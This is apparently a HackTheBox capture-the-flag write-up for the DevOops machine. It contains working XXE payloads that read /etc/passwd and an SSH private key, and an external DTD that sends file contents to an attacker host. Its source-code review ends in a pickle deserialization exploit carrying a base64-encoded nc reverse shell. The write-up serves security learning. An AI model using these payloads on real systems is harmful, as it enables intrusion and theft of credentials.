# DevOops [HTB](https://app.hackthebox.com/machines/140)
![devoops-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/devoops-01.png)

## Recon 

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 devoops.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/ports-02.png)


From here I run a software and version detection scan againts these two portts:

```bash
nmap -p 22,5000 -sCV devoops.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/nmap-res-03.png)


We have the following:

+ An SSH server on port 22.
+ A Gunicorn/19.7.1 server on port 5000.


We only have two services running on this target with HTTP and SSH.


The [gunicorne](https://en.wikipedia.org/wiki/Gunicorn) ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model ported from Ruby’s [Unicorn](https://bogomips.org/unicorn/) project. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resource usage, and fairly speedy.


Finally, based on `nmap` SSH probing scripts we can identify the target OS to be `Ubuntu`.


### Gunicorn Port 5000


If we browse towards `http://devoops.htb:5000` we get the following page:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/site-04.png)


The page says this site is "under construction", and that the feed should be replaced with the `dev.sofia.fi` backend. 


If we search for the term [dev.solita.fi](https://dev.solita.fi/) online, we will find that it's actually a blog for software developers, with developer-oriented insights. The image we see in the main page here is from the solita website feed. 


I wasn't sure what to make of this information, So I decided to run a directory and file scan to discover more about the site. I used the following syntax:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devoops.htb:5000/FUZZ -e .txt,.xml,.html,.py
```

![ffuf-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/ffuf-05.png)


The most relevant entry here in my opinion is the `/upload` directory which returns the following:

![upload-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/upload-06.png)


We can see an XML file upload feature. My mind immediately starts thinking about [XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) attacks. 


At first, I tried to upload a very simple XML file that had a single entity of `exmaple`, which maps to the `/etc/passwd` file on the target:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

This in theory should return the contents of the `/etc/passwd` file once the XML parser of the application gets to our `&example` entity. But after uploading this file to the target I got an internal server error:

![internal-err-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/internal-err-07.png)


I wasn't sure what to make of this error, as it's unclear if the target is actually vulnerable to XXE or the application encountered some other non-related runtime error. So I decided to try and verify an XXE vulnerability using a blind SSRF XXE payload. 


In short, we can craft an XML entity which forces the target application to load a DTD file from an external server we control, thus proving it is vulnerable. The malicious DTD file can look like this:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.52/?x=%file;'>">
%eval;
%exfiltrate;
```


I save this file locally and host it up via a python web server. 


Then, we can trigger the target application to fetch this file via the following XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.52/oops.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

After uploading this XML file to the target I receive a connection to my python server:

![requests-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/requests-08.png)


This proves that the target application is vulnerable to XXE, but we didn't manage to exfiltrate any sensetive data. 


Then I went back to the `/upload` directory. We can see that it says `XML elements: Author, Subject, Content`, maybe we need to send an XML document containing these elements?


So I made the following XML document which contained all three elements:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<Subject>A blog about things</Subject>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<Content>&xxe;</Content>
<link>http://example.com</link>
<description>a post</description>
<Author>author@example.com</Author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```


It's a slightly bigger XML file, but the XXE attack here is exactly the same as the very first XXE document we sent. It's a basic varaible which is mapped to the contents of the local `/etc/passwd` file. 


If we upload this XML document we get the contents of `/etc/passwd`:

![xxe-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/xxe-09.png)


Based on the contents of the `/etc/passwd` file, it looks like there are four user accounts (uid >= 1000) on the system: `osboxes`, `git`, `roosa` & `blogfeed`. And based on the last two lines, it looks like the web application is being deployed from `roosa`'s home directory at `/home/roosa/deploy/src`:

![users-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/users-10.png)


This means that the application should have access to the rest of the files in `roosa`'s home directory. So I modified the `xxe` entity to point towards `/home/roosa/.ssh/id_rsa` to try and capture `roosa`'s private SSH key so we can login with it to the system:

![key-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/key-11.png)


Here it is! 


I copy the contents of the key to a file and save it locally. Then I set the proper permissions for it and login:

```bash
chmod 600 roosa_id_rsa
ssh -i roosa_id_rsa roosa@devoops.htb
```

![roosa-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/roosa-12.png)


## Privilege Escalation

Based on the output from the `id` command in the above screenshot, we can see that `roosa` is a a part of the `sudo` group, which probably means that he has some sudo privileges. But if we try to list he's sudo permissions using `sudo -l` we get prompted for a password which we don't have.


So I start analyzing `roosa`'s home directory:

![home-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/home-dir-13.png)


First I looked at the `service.sh` script, which is a basic bash tameplate for creating a service on a Linux system. Allowing you to start, stop & restart the service using this script. Not super useful.


Then, we have two uncommon directories of `work` and `deploy`. I remember that the `deploy` directory was mentioned in the response we recived after uploading the XML document. So this is probably the location of the source code for the application, I will go through it in the `Beyond Root` section. 


In general, both the `work` and the `deploy` directories have a similar layout, but the `work` directory has something interesting. 


Inside `/home/roosa/work/blogfeed/` we can see a git repository:

![git-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/git-14.png)


If we check the commit history we can see something juicy:

```bash
git log --name-only --oneline
```

![history-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/history-15.png)


There are two back to back commits which modified the same file of `resources/integration/authcredentials.key`. The comment of the `33e87c3` commit says `reverted accidental commit with proper key`, this tells me that a wrong key was accidentally leaked in the first commit, then reverted back in the subsequent commit. 


We can actually compare the difference between the first and the subsequent commits, to try and retrieve the original compromised key:

```bash
git diff 1422e5a d387abf
```

![diff-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/diff-16.png)


I copy this new SSH key over to my attack machine and start logging in as every user on the system. Eventually I try the `root` user and I get a shell:

![root-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/root-17.png)


## Beyond Root

The main source code for the application is located at `/home/roosa/deploy/src/feed.py`, here is an overview of the script:


+ The script starts by importing necessary modules, primarly the `Flask` module to drive the website, and the `xml.sax` module for the XML parser, but there some other module imports as well.


The first interesting function is the `allowed_file(filename)` function which looks like this:

```python
def allowed_file(filename):                                                                              
  return '.' in filename and \                                                                           
    filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```


The purpose of this function to validate the uploaded file's exension to be `.xml`. This is achieved using the `rsplit` method. The method is invoked on the filename with a second argument of `1`, telling the method to split the filename based on the last `.` character only, thus preventing double file extensions attacks. 


For example:

```python
>>> filename = 'test.xml.php'
>>> filename.rsplit('.', 1)[1]
'php'
```


+ The XML parser is comprised of an inhereted class and a dedicated function:

```python
class FeedParse(xml.sax.handler.ContentHandler):                                                         
  def __init__(self, object):                                                                            
    self.obj = object                                                                                    
    self.curpath = []                                                                                    
                                                                                                         
  def startElement(self, name, attrs):                                                                   
    self.chars = ""                                                                                      
    print name,attrs                                                                                     
                                                                                                         
  def endElement(self, name):
      if name in set(['Author','Subject','Content']):
        self.obj[name] = self.chars                                                                        
                                                                                                         
  def characters(self, content):                                                                         
    self.chars += content                                                                                
                                                                                                         
def process_xml(filename, path):                                                                         
  parser = xml.sax.make_parser()                                                                         
  object = {}                                                                                            
  handler = FeedParse(object)                                                                            
  parser.setContentHandler(handler)                                                                      
  parser.parse(open(filename))                                                                           
#  print object
  return " PROCESSED BLOGPOST: \r\n " + \
         " Author: " + object["Author"] + "\r\n" + \ 
         " Subject: " + object["Subject"] + "\r\n" + \
         " Content: " + object["Content"] + "\r\n" + \
         " URL for later reference: " + url_for('uploaded_file',filename=filename) + "\r\n" + \
         " File path: " + path
```


We can see the `FeedParse` class inherits from `xml.sax.handler.ContentHandler` and redefines three methods. Primarly to look for, and parse the `Author`, `Subject` & `Content` elements from the XML documenet. 


The actual XML parsing occurs in the `process_xml()` function, which instantiates the XML parser, and using the newly redefined `FeedPrase` class, extracts the contents of the `Author`, `Subject` & `Content` elemetns from the uploaded XML document and prints them as the response. 


There is no protection againts XXE, no form of input validation, the parser simply trusts whatever is uploaded from the user. Allowing us to inject custom XML entities into any one of the three elements and exfiltrate sensitive data. 


### Newpost

The most interesting thing in the `feed.py` script by far is the `newpost` function:

```python
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data) 
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']
```


As can be seen by the first line, this function is a property mapped to the `/newpost` directory of the application. If we open this directory from our browsers we get the following:

![not-allowed-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/not-allowed-18.png)


This makes sense, as the allowed method is set to `POST`, and we requested the page with `GET`. But what's more interesting is the function itself. 


We can see that it uses the `pickle` python module to unserialize a base64 encoded JSON object. Then, it looks for the `Subject` key in the supplied object, and returns it's value. 


The `pickle` module is used to serialize and unserialize objects transmitted across the network. And just like most serialization processes in other languages, it could be susceptible to [insecure deserialization attacks](https://portswigger.net/web-security/deserialization) if an atacker controls the serialized object passed to the trusting application. This is exactly what goes on here. 


When `pickle` serializes or unserializes an object, it tries to run the `__reduce__` method of the object. This method tells `pickle` how to handle properties in hthe object that dont serialize well. You can read more about this process [here](https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler)


We can exploit this by creating a custom object and defining a `__reduce__` method that has a command injection inside of it which will be executed when `pickle` unserializes the object. 


In a python2 shell, we can start constructing the malicious object as such:

```python
>>> import os 
>>> class Shell(object):		# Has to explicitly inherit from object
...     def __init__(self, cmd):
...             self.cmd = cmd
...     
...     def __reduce__(self):
...             return (os.system, (self.cmd,))   # Has to be a tuple

```

Then, we can use the `dumps` method from the `pickle` module to to serialize our object:

```python
pickle.dumps(Shell('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.54 443 >/tmp/f'))
"cposix\nsystem\np0\n(S'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.54 443 >/tmp/f'\np1\ntp2\nRp3\n."
```


Finally, we can use the `base64` module to encoded the object as for the application's specifications:

```python
base64.urlsafe_b64encode(pickle.dumps(Shell('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.54 443 >/tmp/f')))
'Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAtZiAvdG1wL2Y7bWtub2QgL3RtcC9mIHA7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC41NCA0NDMgPi90bXAvZicKcDEKdHAyClJwMwou'
```

I start a local lisetner using:

```bash
rlwrap nc -lnvp 443
```

And send the object to the application with the following request:

```html
POST /newpost HTTP/1.1
Host: devoops.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 76

Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAtZiAvdG1wL2Y7bWtub2QgL3RtcC9mIHA7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC41NCA0NDMgPi90bXAvZicKcDEKdHAyClJwMwou
```


Which gives me a shell:

![serialized-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/DevOops/img/serialized-19.png)
